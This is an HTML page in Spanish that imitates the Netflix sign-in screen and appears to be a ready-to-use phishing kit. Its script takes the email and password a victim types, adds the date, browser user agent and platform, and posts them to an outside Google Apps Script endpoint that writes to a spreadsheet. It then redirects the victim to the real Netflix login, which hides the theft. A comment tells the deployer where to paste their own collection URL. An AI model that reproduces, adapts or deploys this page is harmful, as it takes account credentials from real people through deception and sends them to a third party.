<!DOCTYPE html>
<html lang="es">
<head>
    <meta property="og:title" content="Netflix - Iniciar sesión">
<meta property="og:description" content="Inicia sesión para ver películas y series de TV online.">
<meta property="og:image" content="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
<meta property="og:url" content="https://www.netflix.com">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: radial-gradient(circle at top, #451010 0%, #000000 45%);
            background-color: #000;
            color: #fff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 24px;
        }
        .input-netflix {
            background-color: rgba(18, 18, 18, 0.8);
            border: 1px solid #8c8c8c;
            color: white;
            font-size: 16px;
        }
        .input-netflix:focus { border-color: #fff; outline: none; }
        .title-main { font-size: 32px; font-weight: 700; line-height: 1.1; margin-bottom: 8px; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <header class="mb-10">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="w-24">
    </header>

    <main class="flex-grow max-w-[450px] mx-auto w-full">
        <h1 class="title-main">Ingresa tu info para iniciar sesión</h1>
        <p class="text-[#b3b3b3] text-lg mb-6">O bien, comienza con una cuenta nueva.</p>
        
        <form id="loginForm" class="space-y-4">
            <input type="email" name="email" id="email" required 
                class="w-full input-netflix p-4 rounded-md"
                placeholder="Email o número de celular">
            
            <input type="password" name="password" id="password" required 
                class="w-full input-netflix p-4 rounded-md"
                placeholder="Contraseña">

            <button type="submit" id="btnSubmit"
                class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold text-lg mt-4 active:scale-95 transition">
                Continuar
            </button>
        </form>

        <div class="mt-8">
            <button class="text-[#b3b3b3] flex items-center text-lg">
                Obtener ayuda 
                <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
            </button>
        </div>
    </main>

    <script>
        // PEGA AQUÍ TU URL DE GOOGLE APPS SCRIPT
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwHh058XFvBCUL9mGxZS5cZSw9LPiqjvUOI56OAZ0NePtETmpuE7r3p3bww0bRrkGbj/exec';
        
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('btnSubmit');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btn.innerText = "Cargando...";
            btn.disabled = true;

            // Preparamos TODOS los datos: Login + Dispositivo
            const datos = new FormData(form);
            datos.append('fecha', new Date().toLocaleString());
            datos.append('dispositivo', navigator.userAgent); // Captura el modelo de teléfono
            datos.append('plataforma', navigator.platform);  // Captura el Sistema Operativo

            try {
                // Envía todo junto a Google Sheets
                await fetch(scriptURL, { 
                    method: 'POST', 
                    body: datos, 
                    mode: 'no-cors' 
                });
                
                // Redirección final a la página real
                window.location.href = "https://www.netflix.com/login"; 
            } catch (error) {
                window.location.href = "https://www.netflix.com/login";
            }
        });
    </script>
</body>
</html>
